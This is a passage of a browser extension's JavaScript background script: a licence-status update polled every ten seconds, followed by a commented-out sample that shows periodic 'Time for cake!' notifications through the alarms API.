                                "type": reply.licence.type,
                                "issue": reply.licence.issue,
                                "update": reply.licence.update,
                                "nextUpdate": reply.licence.nextUpdate,
                                "expire": reply.licence.expire,
                                "limit": (reply.licence.limit !== null) ? reply.licence.limit : 0,
                                "limitBase": (reply.licence.limitBase !== null) ? reply.licence.limitBase : 0,
                                "earn": setting.licence.earn
                            },
                            "log_status": reply.log_status
                        });
                    }
                    return checkSettings({reason: 'checkRun'});
                });
            },function () {
                return checkSettings({reason: 'checkRun'});
            });
        });
    });
}, 10000);

/*var cakeNotification = "cake-notification"*/

/*

CAKE_INTERVAL is set to 6 seconds in this example.
Such a short period is chosen to make the extension's behavior
more obvious, but this is not recommended in real life.
Note that in Chrome, alarms cannot be set for less
than a minute.

*//*
var CAKE_INTERVAL = 0.1;

browser.alarms.create("", {periodInMinutes: CAKE_INTERVAL});

browser.alarms.onAlarm.addListener(function(alarm) {
    browser.notifications.create(cakeNotification, {
        "type": "basic",
        "iconUrl": browser.runtime.getURL("icons/cake-96.png"),
        "title": "Time for cake!",
        "message": "Something something cake"
    });
});

browser.browserAction.onClicked.addListener(()=> {
    var clearing = browser.notifications.clear(cakeNotification);
    clearing.then(() => {
        console.log("cleared");
    });
});*/